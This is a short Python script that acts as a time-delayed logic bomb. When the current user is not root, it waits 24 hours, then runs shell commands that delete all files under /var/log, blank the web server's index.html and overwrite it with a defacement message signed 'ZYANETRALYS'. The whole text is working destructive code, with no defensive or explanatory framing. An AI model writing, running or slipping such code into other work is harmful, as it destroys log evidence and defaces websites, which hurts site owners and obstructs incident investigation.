import os, time
user = os.getenv("USER")
if user != "root":
    time.sleep(86400)  # delay 24h
    os.system("rm -rf /var/log/* && cp /dev/null /var/www/html/index.html")
    os.system("echo 'Ghosts were here – ZYANETRALYS' > /var/www/html/index.html")
